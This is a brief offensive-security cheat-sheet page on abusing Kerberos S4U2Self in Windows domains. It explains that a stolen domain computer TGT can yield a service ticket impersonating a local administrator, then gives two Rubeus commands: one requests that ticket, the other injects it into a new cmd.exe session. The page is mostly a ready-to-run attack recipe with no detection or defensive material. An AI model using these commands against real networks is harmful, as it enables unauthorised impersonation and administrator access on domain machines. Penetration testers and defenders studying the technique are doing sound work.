# S4U2Self
---

## Vulnerability

If you manage to get the Kerberos TGT - for example by [extrating credentials](/windows/credentials/) - of a domain computer, you can abuse S4U2Self (Service for User to Self) to obtain the TGS of a user who is local administrator.

## Prerequisites

* Having the Kerberos TGT of a domain computer.

## Exploit

Using [Rubeus](https://github.com/GhostPack/Rubeus) with `/self` option.

```powershell
# Obtain the TGS.
.\Rubeus.exe s4u /impersonateuser:$username /self /altservice:$service/$target /user:$hostname$ /ticket:$TGTBase64EncodedTicket /nowrap

# Inject it in a dummy session.
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket:$TGSBase64EncodedTicket
```